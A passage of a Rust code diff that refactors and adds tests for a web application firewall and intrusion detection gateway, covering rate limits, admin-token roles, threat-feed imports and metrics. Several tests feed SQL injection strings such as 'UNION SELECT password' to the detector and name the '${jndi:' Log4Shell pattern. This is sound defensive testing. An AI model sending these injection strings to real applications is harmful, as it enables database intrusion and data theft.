-    let state = AppState::load(config).await.map_err(|message| std::io::Error::new(std::io::ErrorKind::InvalidData, message))?.with_rate_limit(rate_limit, rate_limit_window).with_admin_tokens(admin_tokens).with_credentials_source(credentials.source()).with_max_body_size(max_body_bytes);
-    axum::serve(listener, build_app(state)).with_graceful_shutdown(shutdown).await?; Ok(())
+    let rate_limit_window = parse_u64_env(
+        "RATE_LIMIT_WINDOW",
+        std::env::var("RATE_LIMIT_WINDOW").ok().as_deref(),
+        60,
+    )?;
+    let admin_tokens = parse_admin_tokens(
+        credentials
+            .get_credential(CRED_ADMIN_TOKENS)
+            .unwrap_or_default(),
+    );
+    let max_body_bytes = parse_u64_env(
+        "MAX_BODY_BYTES",
+        std::env::var("MAX_BODY_BYTES").ok().as_deref(),
+        1_048_576,
+    )? as usize;
+    let listener = tokio::net::TcpListener::bind(&bind_addr).await?;
+    let local_addr = listener.local_addr()?;
+    println!("waf-ids-ai-soc listening on http://{local_addr}");
+    // Flush so a supervising parent process (the e2e test) sees the readiness
+    // line immediately even though stdout is block-buffered when piped.
+    std::io::Write::flush(&mut std::io::stdout())?;
+    let state = AppState::load(config)
+        .await
+        .map_err(|message| std::io::Error::new(std::io::ErrorKind::InvalidData, message))?
+        .with_rate_limit(rate_limit, rate_limit_window)
+        .with_admin_tokens(admin_tokens)
+        .with_credentials_source(credentials.source())
+        .with_max_body_size(max_body_bytes);
+    let served = axum::serve(listener, build_app(state))
+        .with_graceful_shutdown(shutdown)
+        .await;
+    served?;
+    Ok(())
 }
 
 #[cfg(test)]
 mod tests {
     use super::*;
-    use axum::{body::{Body, to_bytes}, http::{HeaderValue, Request}};
+    use axum::{
+        body::{Body, to_bytes},
+        http::{HeaderValue, Request},
+    };
     use serde::de::DeserializeOwned;
-    use std::{future::IntoFuture, io::{Read, Write}, net::TcpListener as StdTcpListener, thread, time::{SystemTime, UNIX_EPOCH}};
+    use std::{
+        future::IntoFuture,
+        io::{Read, Write},
+        net::TcpListener as StdTcpListener,
+        thread,
+        time::{SystemTime, UNIX_EPOCH},
+    };
     use tower::ServiceExt;
 
-    static ENV_GUARD: std::sync::LazyLock<tokio::sync::Mutex<()>> = std::sync::LazyLock::new(|| tokio::sync::Mutex::new(()));
-    fn clear_run_env() { for name in ["BIND_ADDR","ADMIN_TOKEN","ADMIN_TOKENS","WAF_IDS_STATE_PATH","WAF_IDS_CREDENTIALS_PATH","DNSBL_ORIGIN","EVENT_LIMIT","RATE_LIMIT","RATE_LIMIT_WINDOW","MAX_BODY_BYTES"] { unsafe { std::env::remove_var(name) }; } }
-    fn route() -> RouteConfig { RouteConfig { id:"api".to_string(), path_prefix:"/api".to_string(), upstream:"https://origin.example".to_string(), mode:EnforcementMode::Block, enabled:true, block_threshold:None } }
-    async fn app_request(app:&Router, request:Request<Body>)->Response { app.clone().oneshot(request).await.unwrap() }
-    fn empty_request(method:Method, uri:&str)->Request<Body> { Request::builder().method(method).uri(uri).body(Body::empty()).unwrap() }
-    async fn body_text(response:Response)->String { let bytes=to_bytes(response.into_body(),usize::MAX).await.unwrap(); String::from_utf8(bytes.to_vec()).unwrap() }
-    async fn json_body<T:DeserializeOwned>(response:Response)->T { serde_json::from_str(&body_text(response).await).unwrap() }
+    // Serializes the environment-driven `run_from_env` tests, which mutate
+    // process-global environment variables.
+    // An async mutex so it can be held across the `run_from_env` await points
+    // while serializing the tests that mutate process-global environment vars.
+    static ENV_GUARD: std::sync::LazyLock<tokio::sync::Mutex<()>> =
+        std::sync::LazyLock::new(|| tokio::sync::Mutex::new(()));
 
-    #[test] fn parse_event_limit_reads_optional_env(){assert_eq!(parse_event_limit(None).unwrap(),AppConfig::DEFAULT_EVENT_LIMIT);assert_eq!(parse_event_limit(Some("25")).unwrap(),25);assert!(parse_event_limit(Some("0")).is_err());assert!(parse_event_limit(Some("not-a-number")).is_err());}
-    #[test] fn parse_u32_env_reads_optional_env(){assert_eq!(parse_u32_env("RATE_LIMIT",None,7).unwrap(),7);assert_eq!(parse_u32_env("RATE_LIMIT",Some("120"),0).unwrap(),120);assert!(parse_u32_env("RATE_LIMIT",Some("-1"),0).is_err());}
-    #[test] fn parse_u64_env_reads_optional_env(){assert_eq!(parse_u64_env("RATE_LIMIT_WINDOW",None,60).unwrap(),60);assert_eq!(parse_u64_env("RATE_LIMIT_WINDOW",Some("30"),60).unwrap(),30);assert!(parse_u64_env("RATE_LIMIT_WINDOW",Some("abc"),60).is_err());}
+    fn clear_run_env() {
+        for name in [
+            "BIND_ADDR",
+            "ADMIN_TOKEN",
+            "ADMIN_TOKENS",
+            "WAF_IDS_STATE_PATH",
+            "WAF_IDS_CREDENTIALS_PATH",
+            "DNSBL_ORIGIN",
+            "EVENT_LIMIT",
+            "RATE_LIMIT",
+            "RATE_LIMIT_WINDOW",
+            "MAX_BODY_BYTES",
+        ] {
+            unsafe { std::env::remove_var(name) };
+        }
+    }
 
-    #[tokio::test] async fn admin_console_serves_designed_ui(){let app=build_app(AppState::seeded(None));let html=body_text(app_request(&app,empty_request(Method::GET,"/")).await).await;assert!(html.contains("--brand:#14213d"));assert!(html.contains("--canvas:#f7f8fa"));assert!(html.contains("id=\"routesBody\""));assert!(html.contains("id=\"threatsBody\""));assert!(html.contains("data-url=\"/api/routes\""));assert!(html.contains("data-url=\"/api/threats\""));assert!(html.contains("id=\"hcToggle\""));assert!(html.contains("Skip to content"));assert!(html.contains(":focus-visible"));assert!(html.contains("aria-label=\"Console sections\""));assert!(html.contains("id=\"main\" tabindex=\"-1\""));assert!(html.contains("aria-describedby=\"adminTokenHelp\""));assert!(html.contains("role=\"status\" aria-live=\"polite\" aria-atomic=\"true\""));}
+    #[test]
+    fn parse_event_limit_reads_optional_env() {
+        assert_eq!(
+            parse_event_limit(None).unwrap(),
+            AppConfig::DEFAULT_EVENT_LIMIT
+        );
+        assert_eq!(parse_event_limit(Some("25")).unwrap(), 25);
+        assert!(parse_event_limit(Some("0")).is_err());
+        assert!(parse_event_limit(Some("not-a-number")).is_err());
+    }
 
-    #[test] fn reverses_ipv4_for_dnsbl_zone_names(){assert_eq!(reverse_ipv4_for_dnsbl([192,0,2,10]),"10.2.0.192");}
-    #[test] fn builds_upstream_target_from_route_prefix(){assert_eq!(upstream_target(&route(),"/api/v1/items",Some("limit=1")).unwrap(),"https://origin.example/v1/items?limit=1");assert_eq!(upstream_target(&route(),"/api",None).unwrap(),"https://origin.example/");}
+    #[test]
+    fn parse_u32_env_reads_optional_env() {
+        assert_eq!(parse_u32_env("RATE_LIMIT", None, 7).unwrap(), 7);
+        assert_eq!(parse_u32_env("RATE_LIMIT", Some("120"), 0).unwrap(), 120);
+        assert!(parse_u32_env("RATE_LIMIT", Some("-1"), 0).is_err());
+    }
 
-    #[tokio::test] async fn version_and_readiness_endpoints(){let app=build_app(AppState::seeded(None));let response=app_request(&app,empty_request(Method::GET,"/api/version")).await;assert_eq!(response.status(),StatusCode::OK);let body:serde_json::Value=json_body(response).await;assert_eq!(body["name"],env!("CARGO_PKG_NAME"));assert!(!body["version"].as_str().unwrap().is_empty());}
+    #[test]
+    fn parse_u64_env_reads_optional_env() {
+        assert_eq!(parse_u64_env("RATE_LIMIT_WINDOW", None, 60).unwrap(), 60);
+        assert_eq!(
+            parse_u64_env("RATE_LIMIT_WINDOW", Some("30"), 60).unwrap(),
+            30
+        );
+        assert!(parse_u64_env("RATE_LIMIT_WINDOW", Some("abc"), 60).is_err());
+    }
 
-    #[test] fn health_reports_runtime_configuration(){let state=AppState::new(AppData::seeded(),AppConfig{admin_token:None,state_path:Some(PathBuf::from("state.json")),dnsbl_origin:"dnsbl.example.".to_string(),event_limit:25});assert_eq!(state.health_status().persistence,"file");assert_eq!(state.health_status().dnsbl_origin,"dnsbl.example");}
+    #[test]
+    fn parses_and_limits_phishing_database_feeds() {
+        let domains = parse_phishing_domains(
+            "https://Phish.EXAMPLE/login\n#comment\n\nbad value\na..b.example\n203.0.113.7\nphish.example\nphish.example\n",
+            2,
+        );
+        assert_eq!(domains, vec!["phish.example".to_string()]);
 
-    #[test] fn security_event_log_line_is_single_line_json(){let event=SecurityEvent{id:7,timestamp_unix:1_700_000_000,client_ip:Some("203.0.113.5".parse().unwrap()),route_id:Some("app".to_string()),action:"blocked".to_string(),reason:"builtin sqli rule sqli-union-select".to_string(),score:100,path:"/app".to_string()};let line=security_event_log_line(&event);assert!(!line.contains('\n'));let parsed:SecurityEvent=serde_json::from_str(&line).unwrap();assert_eq!(parsed,event);}
+        let ips = parse_phishing_ips("198.51.100.8\n#skip\nbad-ip\n198.51.100.8\n203.0.113.5", 2);
+        assert_eq!(ips.len(), 2);
+        assert_eq!(ips[0], "198.51.100.8".parse::<IpAddr>().unwrap());
+        assert_eq!(ips[1], "203.0.113.5".parse::<IpAddr>().unwrap());
+    }
 
-    #[tokio::test] async fn run_from_env_binds_and_serves_until_shutdown(){let _guard=ENV_GUARD.lock().await;clear_run_env();unsafe{std::env::set_var("BIND_ADDR","127.0.0.1:0");std::env::set_var("RATE_LIMIT","5");std::env::set_var("RATE_LIMIT_WINDOW","30");std::env::set_var("ADMIN_TOKENS","tok:operator");}run_from_env(Box::pin(std::future::ready(()))).await.unwrap();clear_run_env();}
+    #[tokio::test]
+    async fn run_from_env_binds_and_serves_until_shutdown() {
+        let _guard = ENV_GUARD.lock().await;
+        clear_run_env();
+        unsafe {
+            std::env::set_var("BIND_ADDR", "127.0.0.1:0");
+            std::env::set_var("RATE_LIMIT", "5");
+            std::env::set_var("RATE_LIMIT_WINDOW", "30");
+            std::env::set_var("ADMIN_TOKENS", "tok:operator");
+        }
+        // An already-ready shutdown makes the server bind, then return at once.
+        run_from_env(Box::pin(std::future::ready(())))
+            .await
+            .unwrap();
+        clear_run_env();
+    }
+
+    #[tokio::test]
+    async fn run_from_env_defaults_bind_addr_when_unset() {
+        let _guard = ENV_GUARD.lock().await;
+        clear_run_env();
+        // With BIND_ADDR unset the default listen address is used (exercising the
+        // fallback). The result is ignored because the default port may be busy
+        // in CI; the immediate shutdown keeps any successful bind momentary.
+        let _ = run_from_env(Box::pin(std::future::ready(()))).await;
+        clear_run_env();
+    }
+
+    #[tokio::test]
+    async fn run_from_env_rejects_malformed_rate_limit_window() {
+        let _guard = ENV_GUARD.lock().await;
+        clear_run_env();
+        unsafe {
+            std::env::set_var("BIND_ADDR", "127.0.0.1:0");
+            std::env::set_var("RATE_LIMIT_WINDOW", "not-a-number");
+        }
+        // A malformed window is a hard configuration error, surfaced before bind.
+        assert!(
+            run_from_env(Box::pin(std::future::ready(())))
+                .await
+                .is_err()
+        );
+        clear_run_env();
+    }
+
+    #[tokio::test]
+    async fn run_from_env_rejects_malformed_max_body_bytes() {
+        let _guard = ENV_GUARD.lock().await;
+        clear_run_env();
+        unsafe {
+            std::env::set_var("BIND_ADDR", "127.0.0.1:0");
+            std::env::set_var("MAX_BODY_BYTES", "not-a-number");
+        }
+        assert!(
+            run_from_env(Box::pin(std::future::ready(())))
+                .await
+                .is_err()
+        );
+        clear_run_env();
+    }
+
+    #[tokio::test]
+    async fn run_from_env_surfaces_state_load_failure() {
+        let _guard = ENV_GUARD.lock().await;
+        clear_run_env();
+        let path = std::env::temp_dir().join(format!(
+            "waf_ids_bad_state_{}_{}.json",
+            std::process::id(),
+            now_unix()
+        ));
+        std::fs::write(&path, b"{ not valid json").unwrap();
+        unsafe {
+            std::env::set_var("BIND_ADDR", "127.0.0.1:0");
+            std::env::set_var("WAF_IDS_STATE_PATH", path.to_str().unwrap());
+        }
+        // Bind succeeds, but loading corrupt persisted state maps to an error.
+        assert!(
+            run_from_env(Box::pin(std::future::ready(())))
+                .await
+                .is_err()
+        );
+        clear_run_env();
+        std::fs::remove_file(&path).ok();
+    }
+
+    #[tokio::test]
+    async fn run_from_env_ignores_kev_catalog_url_env_override() {
+        let _guard = ENV_GUARD.lock().await;
+        clear_run_env();
+        unsafe {
+            std::env::set_var("BIND_ADDR", "127.0.0.1:0");
+            std::env::set_var("ADMIN_TOKENS", "tok:operator");
+            std::env::set_var("KEV_CATALOG_URL", "://not-a-valid-url");
+        }
+        // KEV imports now always use the built-in runtime endpoint; an ambient
+        // KEV_CATALOG_URL must not influence process startup at all.
+        run_from_env(Box::pin(std::future::ready(())))
+            .await
+            .unwrap();
+        clear_run_env();
+    }
+
+    fn route() -> RouteConfig {
+        RouteConfig {
+            id: "api".to_string(),
+            path_prefix: "/api".to_string(),
+            upstream: "https://origin.example".to_string(),
+            mode: EnforcementMode::Block,
+            enabled: true,
+            block_threshold: None,
+        }
+    }
+
+    fn enterprise_profile() -> CommercialProfile {
+        CommercialProfile {
+            tenant_id: "cwlab-enterprise".to_string(),
+            deployment_id: "prod-seoul-edge".to_string(),
+            edition: ProductEdition::Enterprise,
+            license_status: LicenseStatus::Active,
+            license_id: Some("LIC-2B-KRW-0001".to_string()),
+            licensee: Some("Contextual Wisdom Enterprise Buyer".to_string()),
+            licensed_until_unix: Some(1_829_088_000),
+            licensed_node_count: Some(12),
+            annual_contract_value_krw: Some(TARGET_SALE_VALUE_KRW),
+            support_contact: "soc-support@example.com".to_string(),
+            features: vec![
+                "rust-edge-gateway".to_string(),
+                "tenant-license-readiness".to_string(),
+                "threat-feed-import".to_string(),
+                "dnsbl-zone-export".to_string(),
+            ],
+        }
+    }
+
+    fn threat_feed_import() -> ThreatFeedImport {
+        ThreatFeedImport {
+            feed_id: "misp-seoul".to_string(),
+            source: "misp://soc.example".to_string(),
+            ttl_seconds: 600,
+            threats: vec![ThreatIndicator {
+                value: "credential_dump".to_string(),
+                indicator_type: "malware".to_string(),
+                severity: Severity::Critical,
+                source: "misp-seoul".to_string(),
+                ttl_seconds: 600,
+            }],
+            dnsbl: vec![DnsblEntry {
+                address: "198.51.100.23".parse().unwrap(),
+                code: "127.0.0.4".to_string(),
+                reason: "feed scanner".to_string(),
+                source: "misp-seoul".to_string(),
+                ttl_seconds: 600,
+                prefix_len: None,
+            }],
+        }
+    }
+
+    fn phishing_database_import_request(base_url: &str) -> PhishingDatabaseImportRequest {
+        PhishingDatabaseImportRequest {
+            feed_id: "phishing-db-seoul".to_string(),
+            source: "https://github.com/Phishing-Database/Phishing.Database".to_string(),
+            domain_url: format!("{base_url}/domains"),
+            ip_url: format!("{base_url}/ips"),
+            ttl_seconds: 900,
+            domain_limit: 10,
+            ip_limit: 10,
+            severity: Severity::Critical,
+            import_domains: true,
+            import_ips: true,
+            allow_non_default_hosts: true,
+        }
+    }
+
+    fn kev_import_request() -> KevImportRequest {
+        KevImportRequest {
+            feed_id: "cisa-kev-seoul".to_string(),
+            source: "feed:cisa-kev".to_string(),
+            ttl_seconds: 900,
+        }
+    }
+
+    async fn app_request(app: &Router, request: Request<Body>) -> Response {
+        app.clone().oneshot(request).await.unwrap()
+    }
+
+    fn empty_request(method: Method, uri: &str) -> Request<Body> {
+        Request::builder()
+            .method(method)
+            .uri(uri)
+            .body(Body::empty())
+            .unwrap()
+    }
+
+    fn authed_empty_request(method: Method, uri: &str, token: &str) -> Request<Body> {
+        Request::builder()
+            .method(method)
+            .uri(uri)
+            .header("x-admin-token", token)
+            .body(Body::empty())
+            .unwrap()
+    }
+
+    fn json_request<T: Serialize>(
+        method: Method,
+        uri: &str,
+        token: Option<&str>,
+        payload: &T,
+    ) -> Request<Body> {
+        let mut builder = Request::builder()
+            .method(method)
+            .uri(uri)
+            .header("content-type", "application/json");
+        if let Some(token) = token {
+            builder = builder.header("x-admin-token", token);
+        }
+        builder
+            .body(Body::from(serde_json::to_vec(payload).unwrap()))
+            .unwrap()
+    }
+
+    fn gateway_get_from_ip(uri: &str, ip: &str) -> Request<Body> {
+        Request::builder()
+            .method(Method::GET)
+            .uri(uri)
+            .header("x-forwarded-for", ip)
+            .body(Body::empty())
+            .unwrap()
+    }
+
+    #[test]
+    fn rate_limit_step_enforces_fixed_window() {
+        // limit 0 disables limiting entirely.
+        assert_eq!(rate_limit_step(100, 0, 999, 0, 60), (true, 0, 999));
+        // First request in a fresh window is allowed and counted.
+        assert_eq!(rate_limit_step(100, 100, 0, 2, 60), (true, 100, 1));
+        // Second allowed; third (at the limit) rejected without advancing count.
+        assert_eq!(rate_limit_step(100, 100, 1, 2, 60), (true, 100, 2));
+        assert_eq!(rate_limit_step(100, 100, 2, 2, 60), (false, 100, 2));
+        // Once the window elapses the counter resets.
+        assert_eq!(rate_limit_step(160, 100, 2, 2, 60), (true, 160, 1));
+    }
+
+    #[tokio::test]
+    async fn gateway_rate_limits_per_client_ip() {
+        let app = build_app(AppState::seeded(None).with_rate_limit(2, 60));
+
+        // Two requests from one IP pass; the third exceeds the budget.
+        for i in 0..2 {
+            let resp = app_request(&app, gateway_get_from_ip("/gateway/demo", "203.0.113.9")).await;
+            assert_eq!(resp.status(), StatusCode::OK, "request {i} should pass");
+        }
+        let blocked = app_request(&app, gateway_get_from_ip("/gateway/demo", "203.0.113.9")).await;
+        assert_eq!(blocked.status(), StatusCode::TOO_MANY_REQUESTS);
+
+        // A different client IP keeps its own independent budget.
+        let other = app_request(&app, gateway_get_from_ip("/gateway/demo", "198.51.100.7")).await;
+        assert_eq!(other.status(), StatusCode::OK);
+    }
+
+    async fn body_text(response: Response) -> String {
+        let bytes = to_bytes(response.into_body(), usize::MAX).await.unwrap();
+        String::from_utf8(bytes.to_vec()).unwrap()
+    }
+
+    #[test]
+    fn prometheus_exposition_emits_typed_gauges() {
+        let text = prometheus_exposition(&kpi_snapshot_at(&AppData::seeded(), 0));
+        // HELP/TYPE metadata plus a value line for a representative metric.
+        assert!(text.contains("# TYPE waf_ids_routes gauge"));
+        assert!(text.contains("waf_ids_routes 1")); // seed has one route
+        assert!(text.contains("waf_ids_dnsbl_entries 1")); // seed has one DNSBL entry
+        assert!(text.contains("waf_ids_security_events 0"));
+        assert!(text.contains("waf_ids_security_events_blocked 0"));
+    }
+
+    #[tokio::test]
+    async fn metrics_endpoint_serves_prometheus_text() {
+        let app = build_app(AppState::seeded(None));
+        let response = app_request(&app, empty_request(Method::GET, "/metrics")).await;
+        assert_eq!(response.status(), StatusCode::OK);
+        let content_type = response
+            .headers()
+            .get("content-type")
+            .and_then(|value| value.to_str().ok())
+            .unwrap_or_default()
+            .to_string();
+        assert!(
+            content_type.starts_with("text/plain"),
+            "unexpected content-type: {content_type}"
+        );
+        let body = body_text(response).await;
+        assert!(body.contains("waf_ids_security_events_blocked"));
+    }
+
+    #[tokio::test]
+    async fn signatures_endpoint_lists_redacted_catalog() {
+        let app = build_app(AppState::seeded(None));
+        let response = app_request(&app, empty_request(Method::GET, "/api/signatures")).await;
+        assert_eq!(response.status(), StatusCode::OK);
+        let body = body_text(response).await;
+        // Exposes rule id, class, and severity for buyer/operator review.
+        assert!(body.contains("sqli-union-select"));
+        assert!(body.contains("\"class\":\"sqli\""));
+        assert!(body.contains("\"severity\":\"critical\"")); // the JNDI/Log4Shell rule
+        // But never the raw match patterns (which would aid evasion).
+        assert!(!body.contains("union select"));
+        assert!(!body.contains("${jndi:"));
+    }
+
+    #[test]
+    fn parse_admin_tokens_maps_tokens_to_actors() {
+        let map = parse_admin_tokens(
+            "tokA:alice, tokB:bob ,tokC, ,:noname, tokD:, tokR:reader:readonly, tokW:writer:write",
+        );
+        assert_eq!(map.get("tokA").map(|p| p.actor.as_str()), Some("alice"));
+        assert!(map.get("tokA").is_some_and(|p| p.can_write));
+        assert_eq!(map.get("tokB").map(|p| p.actor.as_str()), Some("bob"));
+        // No explicit actor, or an empty actor, is labelled "admin".
+        assert_eq!(map.get("tokC").map(|p| p.actor.as_str()), Some("admin"));
+        assert_eq!(map.get("tokD").map(|p| p.actor.as_str()), Some("admin"));
+        assert_eq!(map.get("tokR").map(|p| p.actor.as_str()), Some("reader"));
+        assert!(map.get("tokR").is_some_and(|p| !p.can_write));
+        assert_eq!(map.get("tokW").map(|p| p.actor.as_str()), Some("writer"));
+        assert!(map.get("tokW").is_some_and(|p| p.can_write));
+        // Blank items and blank tokens (":noname") are ignored.
+        assert_eq!(map.len(), 6);
+    }
+
+    #[test]
+    fn rbac_tokens_authorize_and_name_the_actor() {
+        let tokens = parse_admin_tokens("tokA:alice,tokR:reader:readonly");
+        let state = AppState::seeded(None).with_admin_tokens(tokens);
+
+        let mut valid = HeaderMap::new();
+        valid.insert("x-admin-token", "tokA".parse().unwrap());
+        assert!(admin_authenticated(&state, &valid));
+        assert!(admin_authorized(&state, &valid));
+        assert_eq!(audit_actor(&state, &valid), "alice");
+
+        // Readonly authenticates but cannot write.
+        let mut readonly = HeaderMap::new();
+        readonly.insert("x-admin-token", "tokR".parse().unwrap());
+        assert!(admin_authenticated(&state, &readonly));
+        assert!(!admin_authorized(&state, &readonly));
+        assert_eq!(audit_actor(&state, &readonly), "reader");
+
+        // A token not in the RBAC set is rejected, and never used as the actor.
+        let mut wrong = HeaderMap::new();
+        wrong.insert("x-admin-token", "nope".parse().unwrap());
+        assert!(!admin_authorized(&state, &wrong));
+        assert!(!admin_authenticated(&state, &wrong));
+        assert_eq!(audit_actor(&state, &wrong), "admin-token");
+
+        // Missing token header is unauthorized under RBAC.
+        assert!(!admin_authorized(&state, &HeaderMap::new()));
+        assert!(!admin_authenticated(&state, &HeaderMap::new()));
+
+        // Without a matching RBAC token, audit_actor honours X-Admin-Actor.
+        let mut named = HeaderMap::new();
+        named.insert("x-admin-actor", "carol".parse().unwrap());
+        assert_eq!(audit_actor(&state, &named), "carol");
+    }
+
+    #[tokio::test]
+    async fn readonly_token_can_read_audit_logs_but_cannot_write() {
+        let tokens = parse_admin_tokens("write:ops:admin,read:auditor:readonly");
+        let app = build_app(AppState::seeded(None).with_admin_tokens(tokens));
+
+        let denied = app_request(
+            &app,
+            json_request(
+                Method::POST,
+                "/api/routes",
+                Some("read"),
+                &serde_json::json!({
+                    "id": "ro-block",
+                    "path_prefix": "/ro",
+                    "upstream": "mock://x",
+                    "mode": "monitor",
+                    "enabled": true
+                }),
+            ),
+        )
+        .await;
+        assert_eq!(denied.status(), StatusCode::UNAUTHORIZED);
+
+        let created = app_request(
+            &app,
+            json_request(
+                Method::POST,
+                "/api/routes",
+                Some("write"),
+                &serde_json::json!({
+                    "id": "ro-block",
+                    "path_prefix": "/ro",
+                    "upstream": "mock://x",
+                    "mode": "monitor",
+                    "enabled": true
+                }),
+            ),
+        )
+        .await;
+        assert_eq!(created.status(), StatusCode::CREATED);
+
+        let unauth = app_request(&app, empty_request(Method::GET, "/api/audit-logs")).await;
+        assert_eq!(unauth.status(), StatusCode::UNAUTHORIZED);
+
+        let logs: Vec<AuditLogEntry> = json_body(
+            app_request(
+                &app,
+                authed_empty_request(Method::GET, "/api/audit-logs", "read"),
+            )
+            .await,
+        )
+        .await;
+        assert!(logs.iter().any(|e| e.action == "upsert_route"));
+        assert!(!serde_json::to_string(&logs).unwrap().contains("write"));
+        assert!(!serde_json::to_string(&logs).unwrap().contains("read"));
+    }
+
+    #[test]
+    fn security_event_log_line_is_single_line_json() {
+        let event = SecurityEvent {
+            id: 7,
+            timestamp_unix: 1_700_000_000,
+            client_ip: Some("203.0.113.5".parse().unwrap()),
+            route_id: Some("app".to_string()),
+            action: "blocked".to_string(),
+            reason: "builtin sqli rule sqli-union-select".to_string(),
+            score: 100,
+            path: "/app".to_string(),
+        };
+        let line = security_event_log_line(&event);
+        assert!(!line.contains('\n'), "log line must be single-line");
+        // Round-trips as JSON with the expected fields.
+        let parsed: SecurityEvent = serde_json::from_str(&line).unwrap();
+        assert_eq!(parsed, event);
+        assert!(line.contains("\"action\":\"blocked\""));
+        assert!(line.contains("\"score\":100"));
+    }
+
+    async fn json_body<T: DeserializeOwned>(response: Response) -> T {
+        serde_json::from_str(&body_text(response).await).unwrap()
+    }
+
+    #[tokio::test]
+    async fn evaluate_endpoint_scores_payloads_offline() {
+        let app = build_app(AppState::seeded(None));
+        let sqli = json_request(
+            Method::POST,
+            "/api/evaluate",
+            None,
+            &serde_json::json!({"path": "/products", "query": "id=1 UNION SELECT password"}),
+        );
+        let response = app_request(&app, sqli).await;
+        assert_eq!(response.status(), StatusCode::OK);
+        let body: serde_json::Value = json_body(response).await;
+        assert!(body["score"].as_u64().unwrap() >= u64::from(BLOCK_SCORE));
+        assert_eq!(body["would_block"], true);
+        assert!(body["reason"].as_str().unwrap().contains("sqli"));
+        let body_req = json_request(
+            Method::POST,
+            "/api/evaluate",
+            None,
+            &serde_json::json!({"path": "/upload", "body": "x=1 union select 1"}),
+        );
+        let body: serde_json::Value = json_body(app_request(&app, body_req).await).await;
+        assert_eq!(body["would_block"], true);
+        let benign = json_request(
+            Method::POST,
+            "/api/evaluate",
+            None,
+            &serde_json::json!({"path": "/account", "query": "tab=settings"}),
+        );
+        let body: serde_json::Value = json_body(app_request(&app, benign).await).await;
+        assert_eq!(body["score"], 0);
+        assert_eq!(body["would_block"], false);
+    }
+
+    #[tokio::test]
+    async fn version_and_readiness_endpoints() {
+        let app = build_app(AppState::seeded(None));
+        let response = app_request(&app, empty_request(Method::GET, "/api/version")).await;
+        assert_eq!(response.status(), StatusCode::OK);
+        let body: serde_json::Value = json_body(response).await;
+        assert_eq!(body["name"], env!("CARGO_PKG_NAME"));
+        assert!(!body["version"].as_str().unwrap().is_empty());
+        let response = app_request(&app, empty_request(Method::GET, "/readyz")).await;
+        assert_eq!(response.status(), StatusCode::OK);
+        let body: serde_json::Value = json_body(response).await;
+        assert_eq!(body["ready"], true);
+        let disable = json_request(
+            Method::POST,
+            "/api/routes",
+            None,
+            &serde_json::json!({"id": "demo", "path_prefix": "/demo", "upstream": "mock://x", "mode": "monitor", "enabled": false}),
+        );
+        assert!(app_request(&app, disable).await.status().is_success());
+        let response = app_request(&app, empty_request(Method::GET, "/readyz")).await;
+        assert_eq!(response.status(), StatusCode::SERVICE_UNAVAILABLE);
+        let body: serde_json::Value = json_body(response).await;
+        assert_eq!(body["ready"], false);
+    }
+
+    #[tokio::test]
+    async fn events_endpoint_filters_by_action_and_limit() {
+        let app = build_app(AppState::seeded(None));
+        let route = json_request(
+            Method::POST,
+            "/api/routes",
+            None,
+            &serde_json::json!({"id": "app", "path_prefix": "/app", "upstream": "mock://x", "mode": "block", "enabled": true}),
+        );
+        assert!(app_request(&app, route).await.status().is_success());
+        app_request(
+            &app,
+            gateway_get_from_ip("/gateway/app?q=1%20UNION%20SELECT%201", "203.0.113.9"),
+        )
+        .await;
+        app_request(
+            &app,
+            gateway_get_from_ip("/gateway/demo?q=hi", "203.0.113.9"),
+        )
+        .await;
+        let all: Vec<serde_json::Value> =
+            json_body(app_request(&app, empty_request(Method::GET, "/api/events")).await).await;
+        assert_eq!(all.len(), 2);
+        let blocked: Vec<serde_json::Value> = json_body(
+            app_request(
+                &app,
+                empty_request(Method::GET, "/api/events?action=blocked"),
+            )
+            .await,
+        )
+        .await;
+        assert_eq!(blocked.len(), 1);
+        assert_eq!(blocked[0]["action"], "blocked");
+        let recent: Vec<serde_json::Value> =
+            json_body(app_request(&app, empty_request(Method::GET, "/api/events?limit=1")).await)
+                .await;
+        assert_eq!(recent.len(), 1);
+        assert_eq!(recent[0]["action"], "monitored");
+    }
+
+    #[tokio::test]
+    async fn per_route_block_threshold_overrides_global() {
+        let app = build_app(AppState::seeded(None));
+        let indicator = json_request(
+            Method::POST,
+            "/api/threats",
+            None,
+            &serde_json::json!({"value": "probe-xyz", "indicator_type": "test", "severity": "low", "source": "t", "ttl_seconds": 60}),
+        );
+        assert!(app_request(&app, indicator).await.status().is_success());
+        let low = json_request(
+            Method::POST,
+            "/api/routes",
+            None,
+            &serde_json::json!({"id": "low", "path_prefix": "/low", "upstream": "mock://x", "mode": "block", "enabled": true, "block_threshold": 5}),
+        );
+        assert!(app_request(&app, low).await.status().is_success());
+        let hi = json_request(
+            Method::POST,
+            "/api/routes",
+            None,
+            &serde_json::json!({"id": "hi", "path_prefix": "/hi", "upstream": "mock://x", "mode": "block", "enabled": true}),
+        );
+        assert!(app_request(&app, hi).await.status().is_success());
+        let blocked =
+            app_request(&app, empty_request(Method::GET, "/gateway/low?q=probe-xyz")).await;
+        assert_eq!(blocked.status(), StatusCode::FORBIDDEN);
+        let allowed =
+            app_request(&app, empty_request(Method::GET, "/gateway/hi?q=probe-xyz")).await;
+        assert_ne!(allowed.status(), StatusCode::FORBIDDEN);
+        let bad = json_request(
+            Method::POST,
+            "/api/routes",
+            None,
+            &serde_json::json!({"id": "z", "path_prefix": "/z", "upstream": "mock://x", "mode": "block", "enabled": true, "block_threshold": 0}),
+        );
+        assert_eq!(
+            app_request(&app, bad).await.status(),
+            StatusCode::BAD_REQUEST
+        );
+    }
+
+    #[tokio::test]
+    async fn oversized_request_body_is_rejected() {
+        let app = build_app(AppState::seeded(None).with_max_body_size(16));
+        let big = Request::builder()
+            .method(Method::POST)
+            .uri("/gateway/demo")
+            .body(Body::from("x".repeat(64)))
+            .unwrap();
+        assert_eq!(
+            app_request(&app, big).await.status(),
+            StatusCode::PAYLOAD_TOO_LARGE
+        );
+        let small = Request::builder()
+            .method(Method::POST)
+            .uri("/gateway/demo")
+            .body(Body::from("x"))
+            .unwrap();
+        assert_ne!(
+            app_request(&app, small).await.status(),
+            StatusCode::PAYLOAD_TOO_LARGE
+        );
+    }
+
+    #[tokio::test]
+    async fn admin_console_serves_designed_ui() {
+        let app = build_app(AppState::seeded(None));
+        let html = body_text(app_request(&app, empty_request(Method::GET, "/")).await).await;
+
+        // Foundation design tokens are source-true (must match Figma variables).
+        assert!(html.contains("--brand:#14213d"), "brand token missing");
+        assert!(html.contains("--canvas:#f7f8fa"), "canvas token missing");
+        // Designed components render, not the old raw-JSON <pre> dumps.
+        assert!(
+            html.contains("id=\"routesBody\""),
+            "routes table container missing"
+        );
+        assert!(
